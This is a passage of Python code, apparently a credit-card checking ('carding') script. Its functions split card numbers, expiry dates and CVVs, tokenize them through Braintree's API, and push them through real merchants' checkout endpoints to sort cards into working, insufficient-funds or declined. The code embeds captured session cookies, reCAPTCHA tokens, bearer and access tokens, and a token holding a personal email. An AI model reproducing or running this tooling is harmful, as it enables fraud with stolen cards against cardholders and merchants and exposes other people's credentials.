		m=(response.json()['messages'])
		m=m.split('class=\"woocommerce-error\">\n\t\t\t<li>')[1].split('</li>\n\t</ul>\n')[0]
		return m
	except:
		up()
		return 'Declined'
def brr(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	ua = UserAgent()
	user = ua.random
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTM2NzA4MzgsImp0aSI6IjdhMTNhZDI3LTg5MTUtNGZmMC04MTdjLTMyZjBkZjUwMmQ0ZCIsInN1YiI6IjUycXI0OHR4bXpycnZzZHQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjUycXI0OHR4bXpycnZzZHQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.SzexuF_vWecdPoE_WjLPWZq7DEuRLceG58B0S9ZvEYlcEVBmGAoCx7Xc1Muf1bdCO_66c6yGkiNXWG5CM7_onA',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '0d879e8c-4528-4f3b-86f2-452f15061718',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok =(response.json()['data']['tokenizeCreditCard']['token'])	
	cookies = {
	    '_gcl_au': '1.1.1097179027.1713404439',
	    '_fbp': 'fb.1.1713404440865.35376848',
	    '_ga': 'GA1.1.172464778.1713404442',
	    '_tt_enable_cookie': '1',
	    '_ttp': 'T2JxjyIeNMDD5qJsZsGh47e-AaD',
	    '_pin_unauth': 'dWlkPU5HWmpaVEV6TkRBdFlUa3lOQzAwWkdReExXSTNNemt0WldNek5ESTFOell5TTJKaw',
	    'unbxd.userId': 'uid-1713404447025-3749',
	    '_cq_duid': '1.1713404447.HAG0MwAN2eXz0diR',
	    '_uetsid': 'ad28a640fd2411eeb332e7099b3dfa92',
	    '_uetvid': 'ad298450fd2411ee90e71df87ece9681',
	    '_clck': '1jd73rv%7C2%7Cfl3%7C0%7C1570',
	    'OptiContacts': 'return',
	    'mv_cache_source': 'return',
	    'MV_SESSION_ID': 'xZHs8YGqnxqBTwXq:154.182.42.53',
	    'unbxd.visit': 'repeat',
	    'unbxd.visitId': 'visitId-1713584243917-25243',
	    '_cq_suid': '1.1713584263.xoCnWZgjTbMvTMRQ',
	    'cto_bundle': 'DZ3U419XY014NGZja0J5UWxkSUFaVDJ4YXpDcWtqREFtbDRDJTJCak4zb3B2T2ZPayUyQlolMkZPZWY4dTdmNlFkSnJHNWVhQXlUQUglMkZOVGtNTUYxQ2VOMktmRExDR2FrZGNtRnhoajhjNiUyRmRoa1g5R1ZPMVNFV3pjVllualpPWHZiJTJGN3lJNGM1N003NVU4RG9tcUtoWjlNcjAlMkJXOFFXUSUzRCUzRA',
	    'rxParamsGL': '%7B%22lastProduct%22%3A%7B%7D%2C%22rxType%22%3A%22distance%22%2C%22OD%22%3A%7B%22sph%22%3A%22%22%2C%22cyl%22%3A%22%22%2C%22axis%22%3A%22%22%2C%22add%22%3A%22%22%7D%2C%22OS%22%3A%7B%22sph%22%3A%22%22%2C%22cyl%22%3A%22%22%2C%22axis%22%3A%22%22%2C%22add%22%3A%22%22%7D%2C%22lens%22%3A%7B%22sku%22%3A%22%22%7D%2C%22coatings%22%3A%7B%7D%7D',
	    'nitems': '1',
	    'basket_cookie_chunks': '0',
	    'litems': '1',
	    '_clsk': '1usn3y%7C1713584441737%7C10%7C1%7Ca.clarity.ms%2Fcollect',
	    'basket_cookie': '%7b%22price1%22%3a%2228%2e00%22%2c%22descrip1%22%3a%22Robson%22%2c%22lenses_descrip1%22%3a%22Standard%20Lenses%22%2c%22href1%22%3a%22https%3a%2f%2fwww%2ekits%2ecom%2fglasses%2fGL01050%2ehtml%3fconfig%3d000002531%22%2c%22src1%22%3a%22%2fcart%2fimages%2fframes%2fitems%2f5%2f52%2f52000002531_IMG_green%2epng%22%2c%22qty1%22%3a%221%22%2c%22subtot%22%3a%2228%22%2c%22number_total_items%22%3a%221%22%2c%22totqty%22%3a%221%22%2c%22mv_locale%22%3a%22en_US%22%7d',
	    '_ga_8YQPSJBW5Y': 'GS1.1.1713584247.5.1.1713584443.0.0.0',
	    '_ga_6V4LEK6WHW': 'GS1.1.1713584231.5.1.1713584455.36.0.0',
	}
	
	headers = {
	    'authority': 'www.kits.com',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/json',
	    # 'cookie': '_gcl_au=1.1.1097179027.1713404439; _fbp=fb.1.1713404440865.35376848; _ga=GA1.1.172464778.1713404442; _tt_enable_cookie=1; _ttp=T2JxjyIeNMDD5qJsZsGh47e-AaD; _pin_unauth=dWlkPU5HWmpaVEV6TkRBdFlUa3lOQzAwWkdReExXSTNNemt0WldNek5ESTFOell5TTJKaw; unbxd.userId=uid-1713404447025-3749; _cq_duid=1.1713404447.HAG0MwAN2eXz0diR; _uetsid=ad28a640fd2411eeb332e7099b3dfa92; _uetvid=ad298450fd2411ee90e71df87ece9681; _clck=1jd73rv%7C2%7Cfl3%7C0%7C1570; OptiContacts=return; mv_cache_source=return; MV_SESSION_ID=xZHs8YGqnxqBTwXq:154.182.42.53; unbxd.visit=repeat; unbxd.visitId=visitId-1713584243917-25243; _cq_suid=1.1713584263.xoCnWZgjTbMvTMRQ; cto_bundle=DZ3U419XY014NGZja0J5UWxkSUFaVDJ4YXpDcWtqREFtbDRDJTJCak4zb3B2T2ZPayUyQlolMkZPZWY4dTdmNlFkSnJHNWVhQXlUQUglMkZOVGtNTUYxQ2VOMktmRExDR2FrZGNtRnhoajhjNiUyRmRoa1g5R1ZPMVNFV3pjVllualpPWHZiJTJGN3lJNGM1N003NVU4RG9tcUtoWjlNcjAlMkJXOFFXUSUzRCUzRA; rxParamsGL=%7B%22lastProduct%22%3A%7B%7D%2C%22rxType%22%3A%22distance%22%2C%22OD%22%3A%7B%22sph%22%3A%22%22%2C%22cyl%22%3A%22%22%2C%22axis%22%3A%22%22%2C%22add%22%3A%22%22%7D%2C%22OS%22%3A%7B%22sph%22%3A%22%22%2C%22cyl%22%3A%22%22%2C%22axis%22%3A%22%22%2C%22add%22%3A%22%22%7D%2C%22lens%22%3A%7B%22sku%22%3A%22%22%7D%2C%22coatings%22%3A%7B%7D%7D; nitems=1; basket_cookie_chunks=0; litems=1; _clsk=1usn3y%7C1713584441737%7C10%7C1%7Ca.clarity.ms%2Fcollect; basket_cookie=%7b%22price1%22%3a%229%2e00%22%2c%22descrip1%22%3a%22London%20Fog%20LF%20412%22%2c%22lenses_descrip1%22%3a%22Standard%20Lenses%22%2c%22href1%22%3a%22https%3a%2f%2fwww%2ekits%2ecom%2fglasses%2fGL00279%2ehtml%3fconfig%3d000000630%22%2c%22src1%22%3a%22%2fcart%2fimages%2fframes%2fitems%2f8%2f81%2f81000000630_IMG_green%2epng%22%2c%22qty1%22%3a%221%22%2c%22subtot%22%3a%229%22%2c%22number_total_items%22%3a%221%22%2c%22totqty%22%3a%221%22%2c%22mv_locale%22%3a%22en_US%22%7d; _ga_8YQPSJBW5Y=GS1.1.1713584247.5.1.1713584443.0.0.0; _ga_6V4LEK6WHW=GS1.1.1713584231.5.1.1713584455.36.0.0',
	    'origin': 'https://www.kits.com',
	    'referer': 'https://www.kits.com/ord/checkout.html',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'nonce': tok,
	    'agreement1': 1,
	    'payment_type': 'cc',
	}
	
	response = requests.post('https://www.kits.com/api/payment/finish',headers=headers, json=json_data)
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"nonce":"tokencc_bh_92ty85_n7ck2k_md6wdd_pdv929_nxz","agreement1":1,"payment_type":"cc"}'
	#response = requests.post('https://www.kits.com/api/payment/finish', cookies=cookies, headers=headers, data=data)
	try:
		k=(response.json()['errors'][0])
		try:
			k=k.split(':')[2]
		except:pass
		return k
	except:
		pass
	if 'true' in response.text or 'True' in response.text:
		msg=f'Payment completed successfully'
	elif 'Funds' in response.text:
		msg=f'Insufficient Funds'
	else:
		return ('#ERROE#')
def be(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	cookies = {
	    '_ga': 'GA1.2.197546107.1712183919',
	    '_gid': 'GA1.2.421236434.1712183919',
	    '_gat': '1',
	    '_ga_93VBC82KGM': 'GS1.2.1712183920.1.1.1712185262.0.0.0',
	}
	
	headers = {
	    'authority': 'app.brandmark.io',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/json;charset=UTF-8',
	    # 'cookie': '_ga=GA1.2.197546107.1712183919; _gid=GA1.2.421236434.1712183919; _gat=1; _ga_93VBC82KGM=GS1.2.1712183920.1.1.1712185262.0.0.0',
	    'origin': 'https://app.brandmark.io',
	    'referer': 'https://app.brandmark.io/v3/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
	}
	
	json_data = {
	    'recaptcha_token': '03AFcWeA5n9WBF9yWy_ps8GmIkDTyQdSopq6uAiGZeJTo4RwWFBlEDNw9Kn5IWrwcwp1D0CJSnUG7ylk58MVaX7o13aJ8LL6RWLv7UgnTe7WA50aivKYLAoSKpnjR3CSnuYetNuDXMLelUbcVFUWRvrs5xWziWojSHA8Za8CnvD1D-QB76YCpP6Qwl-NDFLP_DQEjaIbbyy2tr4AcjSJJ-wS-5wqrvt6raIVjdliQQ7rmSMu-Bq2aEGmiIqMoLxJ3vRSQ6Enny8Pr2b5SMZ73YFlBKFyGw6BHhIFOqmRd-Om8HrdBxTM8NMJArjkCEgJrBZESgI4ECMna_LMGWmvqi_DvWJAYIGDqDyg3H448dzVY59CsvasHBKCFZ7bciegrGxxS9Fc-GvWGtEZLiOCQ6bHQsb571nj4MchDjR5zJ9q2fZytnCNuLjQESCc7DbGDFbKDaO4qXQ_ZEx5OQ8AxEZMzqKx1unolewnS7O9Gt07CMSDC6If-iFdhk7KqcSUfV-3ba8l11PZ9pr4hrskH6wnnDcek0Ufsn0SZfXlpjOQM3gVy3NIZj5v4wAY3kjTt7FDYCA2s4a0xiBhdcCpTidILjXcmBRkBNVTSbp3beB6oUoqRD2yFkAZD_M-JhbIq7fe-Cb7o-boRKrCNHFunjx6PSs6ivKSvkdEWCmd02a8q8Hprls6koV8GU0r5RH_d-XyedUStSVt283GtdEVvdhS8InZpxa-srkKcKcp4JhNcB4Yd7TEpfDv4E2hPvBkBo-AsmKTmO4Amw-ypsCs5yxHEKZ5H-nLMEwOw3T6dZUGc-6v5yPNuPODs4eLzHKijituADwiSIcQqHkMQ_WKAa9txJ5WXGVaw4OdtGVGSxg1Y63T0VaJixTT_ZdmyuTgP7L-XbJctLG2yrsOiWC2gqvYH1AOEnymIMJBrWW_g036QRnr0HwyEGYHjY-Nr3PIqxBpDRU9wfCNdUFBgL2Ev5ApMygY8mu1B5HNMA1pHwQjHOfVpGhjnkntM-QG6-oEzRj020IjWDYrD4LuXnJJDfG3eCtQglSxEzjP3rQMJrfTrpbqJkvnBOETpY4mHXURhqUuzLAjN6Eay_GUo5godUgBsajqfhXSnV2qdQiMc9MGzbyUOpNq3QhMtmxSvqv45eKTwrFobdfsTwak2LkMMEIbuw21MVWpg76fbY5JQ2WAF3w5s0nh8EobAdGzpRlZkt3ea9zC_OLF0FIJAgbLHN0dHcR-lbp4rfjfBhRtx3wqeq5xRzdPeE2UUzfsXiCymIRDnVkSbFOowoFGEoftsQjH8rsNWztAwyQr0l5_9WOWBHMliAofRiNDuFqVQtfIoaSjR-O7n45hkvBAHsRMtrY0_OMo7-3zEG0tukb8Ysx2EC7OkRYvqJJbWd3E2c7V-foNgKzV1b_jdmfmsCpHrwTnnHQ50qj3GafTndm0rCBtjPH6id3JaYCjeD31ed297XRXio6E6yBdKy_-2JUfm3opA5KRLFidCkmvUYx1l4nOwO0-2RMv6KAlPrFy0AK6olDKgX-K-uaXQyigsi9NqmDO0PWebNONT8bx9wqVsRhIm6ZS7JCdQsdb4aZoA46_HK_FQdW04ocGAuOxWdfX0s62Je-wRZFaHrNA3Ajt8_YZ6Dc6z2GNKE0dlRJtpYCwqPxnCddwJic56CW8jO9Ih7gu_2FoFEZaEFQXA_yv9IBLKhEjjHDmaujFI1-AC5RiJ3u8zpkImR8TP42Va71nnfn2BmgQU9hKhDqUh2OPpO2f9lMwfPTCpuFK5hsa8LXAhQMgkk4XWga3jLmNXVmXb3nTbEi4EcFRQiPwwANL4dY4MqVZMqv248grg1ADW0u7Z1E2u38dS_0VEuMwg59UwZF9WoSxGLOs845s1RvpAvrcTCfD5DHIcaJOmpmhgoaz_OjvgDorhRY-t-B2FtvwP9BzdmxGjSYcsYzhzUWCa6vBuukADStpI3jjrz7u1AM0-tgn0I_getneZNaT_RMHHE5iievwmEeZAjYQ',
	    'token': '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',
	    'user_id': 'Qb7eJOxZFVc4bIXxFkRzRPZSbko2',
	    'access_token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjgwNzhkMGViNzdhMjdlNGUxMGMzMTFmZTcxZDgwM2I5MmY3NjYwZGYiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiVkJGIiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0laRlpBMlFaSGZSN044b0JtZ1phZV9aM0VCYzU0LUpzLU8taUJQUmRQQ0oyVkdrdz1zOTYtYyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9icmFuZG1hcmstaW8iLCJhdWQiOiJicmFuZG1hcmstaW8iLCJhdXRoX3RpbWUiOjE3MTIxODQwNjIsInVzZXJfaWQiOiJRYjdlSk94WkZWYzRiSVh4RmtSelJQWlNia28yIiwic3ViIjoiUWI3ZUpPeFpGVmM0YklYeEZrUnpSUFpTYmtvMiIsImlhdCI6MTcxMjE4NDA2MiwiZXhwIjoxNzEyMTg3NjYyLCJlbWFpbCI6InZpc2FzcGFtNzdAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZ29vZ2xlLmNvbSI6WyIxMTIxOTU0NzY2ODEzMjczNDQ4NjciXSwiZW1haWwiOlsidmlzYXNwYW03N0BnbWFpbC5jb20iXX0sInNpZ25faW5fcHJvdmlkZXIiOiJnb29nbGUuY29tIn19.FqQOaL5Gh7p4QjqaTy6G0trQ2QLnonYQg27egGs4nOkD66MVbUSNDsYwUvD709AW42m7Jij3ijEzpB5ReztYHOyUP7SzMe9pTaJaU8gyOkUe_LRwCCL4kG-kRf3helMjgyscyNmZ-XfevHceKDkN45p8EYaJsROl_xGgeBG6eGYGf0rDx9Rn_y209PsPd1ewsep4YsfvEBOEVVJUZNBq3l2xZhiV7lEcLj4ZmYzmbyxub276XMe0la2gVS1WNQZ6zvYsvcV8dcdowT_M18wCw5jNiLtFRGWKGzsPaQrl8SfZD6hHHGqhokJcl8fqbaHFf3ohzT8Jejq71SXSaGwrpQ',
	}
	
	response = requests.post('https://app.brandmark.io/v3/client_token.php', cookies=cookies, headers=headers, json=json_data)
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"recaptcha_token":"03AFcWeA5n9WBF9yWy_ps8GmIkDTyQdSopq6uAiGZeJTo4RwWFBlEDNw9Kn5IWrwcwp1D0CJSnUG7ylk58MVaX7o13aJ8LL6RWLv7UgnTe7WA50aivKYLAoSKpnjR3CSnuYetNuDXMLelUbcVFUWRvrs5xWziWojSHA8Za8CnvD1D-QB76YCpP6Qwl-NDFLP_DQEjaIbbyy2tr4AcjSJJ-wS-5wqrvt6raIVjdliQQ7rmSMu-Bq2aEGmiIqMoLxJ3vRSQ6Enny8Pr2b5SMZ73YFlBKFyGw6BHhIFOqmRd-Om8HrdBxTM8NMJArjkCEgJrBZESgI4ECMna_LMGWmvqi_DvWJAYIGDqDyg3H448dzVY59CsvasHBKCFZ7bciegrGxxS9Fc-GvWGtEZLiOCQ6bHQsb571nj4MchDjR5zJ9q2fZytnCNuLjQESCc7DbGDFbKDaO4qXQ_ZEx5OQ8AxEZMzqKx1unolewnS7O9Gt07CMSDC6If-iFdhk7KqcSUfV-3ba8l11PZ9pr4hrskH6wnnDcek0Ufsn0SZfXlpjOQM3gVy3NIZj5v4wAY3kjTt7FDYCA2s4a0xiBhdcCpTidILjXcmBRkBNVTSbp3beB6oUoqRD2yFkAZD_M-JhbIq7fe-Cb7o-boRKrCNHFunjx6PSs6ivKSvkdEWCmd02a8q8Hprls6koV8GU0r5RH_d-XyedUStSVt283GtdEVvdhS8InZpxa-srkKcKcp4JhNcB4Yd7TEpfDv4E2hPvBkBo-AsmKTmO4Amw-ypsCs5yxHEKZ5H-nLMEwOw3T6dZUGc-6v5yPNuPODs4eLzHKijituADwiSIcQqHkMQ_WKAa9txJ5WXGVaw4OdtGVGSxg1Y63T0VaJixTT_ZdmyuTgP7L-XbJctLG2yrsOiWC2gqvYH1AOEnymIMJBrWW_g036QRnr0HwyEGYHjY-Nr3PIqxBpDRU9wfCNdUFBgL2Ev5ApMygY8mu1B5HNMA1pHwQjHOfVpGhjnkntM-QG6-oEzRj020IjWDYrD4LuXnJJDfG3eCtQglSxEzjP3rQMJrfTrpbqJkvnBOETpY4mHXURhqUuzLAjN6Eay_GUo5godUgBsajqfhXSnV2qdQiMc9MGzbyUOpNq3QhMtmxSvqv45eKTwrFobdfsTwak2LkMMEIbuw21MVWpg76fbY5JQ2WAF3w5s0nh8EobAdGzpRlZkt3ea9zC_OLF0FIJAgbLHN0dHcR-lbp4rfjfBhRtx3wqeq5xRzdPeE2UUzfsXiCymIRDnVkSbFOowoFGEoftsQjH8rsNWztAwyQr0l5_9WOWBHMliAofRiNDuFqVQtfIoaSjR-O7n45hkvBAHsRMtrY0_OMo7-3zEG0tukb8Ysx2EC7OkRYvqJJbWd3E2c7V-foNgKzV1b_jdmfmsCpHrwTnnHQ50qj3GafTndm0rCBtjPH6id3JaYCjeD31ed297XRXio6E6yBdKy_-2JUfm3opA5KRLFidCkmvUYx1l4nOwO0-2RMv6KAlPrFy0AK6olDKgX-K-uaXQyigsi9NqmDO0PWebNONT8bx9wqVsRhIm6ZS7JCdQsdb4aZoA46_HK_FQdW04ocGAuOxWdfX0s62Je-wRZFaHrNA3Ajt8_YZ6Dc6z2GNKE0dlRJtpYCwqPxnCddwJic56CW8jO9Ih7gu_2FoFEZaEFQXA_yv9IBLKhEjjHDmaujFI1-AC5RiJ3u8zpkImR8TP42Va71nnfn2BmgQU9hKhDqUh2OPpO2f9lMwfPTCpuFK5hsa8LXAhQMgkk4XWga3jLmNXVmXb3nTbEi4EcFRQiPwwANL4dY4MqVZMqv248grg1ADW0u7Z1E2u38dS_0VEuMwg59UwZF9WoSxGLOs845s1RvpAvrcTCfD5DHIcaJOmpmhgoaz_OjvgDorhRY-t-B2FtvwP9BzdmxGjSYcsYzhzUWCa6vBuukADStpI3jjrz7u1AM0-tgn0I_getneZNaT_RMHHE5iievwmEeZAjYQ","token":"l7AumChJS3xsGcg8w8qmfnHPmuBsi8/K3FtJ37iNG3TQBGdzfD5DI1UWPCtS4NGcJE+/SeiqN/xaIoVsIMtJjECR3eOdUu2vc7Ga+OOexqAosKKPmzWr75uIj6kRvIYeMQVSeJ+owI9ULhPw8KUm5U0CfbW65mEi6HWBMNj1aa/TPhe6edFZWmd7JBx/InQqUsIxbdZo1BCAHJDIDJFGEEABHkttq5MxRo9+d6F5gG6/Hzr+Xqw+QeIA4a732mEvdVb2m1tLJCCAsJBgICMj4Q9kpegdrLXl3zJR08Gc8P1mR5FlUPcQwFpm+RInYILYnhjpY9Z5SXac1aKDrVOx+KTnH2QkB/bUIKjNE0AKPTJPt5Qe04PcYX1Mpqfwg2q1A+d+2JqhykPkEPqPeys7PPq3r8C6fm+hQAze3Oagn7WOjHeMjdPGNFxa8rZaouJ88uqB2kESTRyCXuKIwaJbEJroIM8ITfV3FwEQ7eKuQ9ypQAilisPeuNJ0rBW/Pg/qq4qxH9el3F0pgaCIX94Xc6ibNnMtGTvrx4ws2hRkTwiFluVQx48tZVb96gKWearpPGAs1k8MvWzq9bqKXb80LOdVe9WQpo0s6D16oIS/oAoC/Kc8t7nx5qLwKS8ZTL/BWBAM5ErMMD9VaYR6lamL+HBTT5p29ovyNkVXQDIPCNQGQQtvxWiSLH8cKrBlhNf3yeGupGlqa5M/uj6zQx1TCqVNu9amMm4dtcH9Nt8FYiZO5tWr33VQ4wSzbYsqUB0gbSmW5wU+McWAorMqMjH5dzagGYZIWEN3W4CJTDmF+GRXhIeVHkyumZtqLnHDXPss7YjxbopmIXzaBLFX1Vw/0gv6pv8MKwGNxfJaMfVh1VZRvKGYJFe3JnOcSOTP9Wboj0xzOI0js6fPQQwACl4er8tKov7lPCBuBTTCUgQg7m7aR0fYlz6hwVhbdpfEkLuy2kWX2z5PH9AkcOqFcJJGSPS6kavJw9SMpHf4phiwBF/VBha2sMCXb/1BAlI7EuvLTSHfphEsyCR6H5cCIfQk/O+/No7J7bftXcyi9VTgnyQZY+fwr86ox7Cu1sNfdsyfDlflDPByIwI1HkBipGXn6JfNef8LVkDcPG+LfB8Ogr4qOJ+5CoJyfVqMui4YzLdoV893jmVq1OvVp2DVqUuxoHPnKUOsq6m4/txXtNs/WGiu8jLUkUyxRV7c0NRcn/uVy3BjWn//gZqObaxZtJMAk/sqhl/FUkvsg3cxuQcXn5mRkjjgIe/ag1QKOdr9GU